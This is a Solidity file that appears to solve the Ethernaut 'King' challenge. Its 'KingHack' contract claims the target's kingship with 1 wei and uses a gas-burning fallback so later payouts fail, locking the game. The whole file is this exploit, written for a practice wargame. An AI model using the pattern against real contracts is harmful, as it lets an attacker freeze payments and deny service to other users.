pragma solidity ^0.4.24;

import '../installed_contracts/zeppelin/contracts/ownership/Ownable.sol';

contract King is Ownable {
  function() external payable {
  }
}

contract KingHack {
    address public level;
    address public mywallet;
    event log(uint256 indexed val);
    
    constructor(address _inst) public {
        level = _inst;
        King(level).send(1);
        mywallet = msg.sender;
    }
    
    function () payable {
        mywallet.send(msg.value);
        
        // waste gasleft
        for(uint i = 0; i < 1000; i++)
            log(i);
    }
}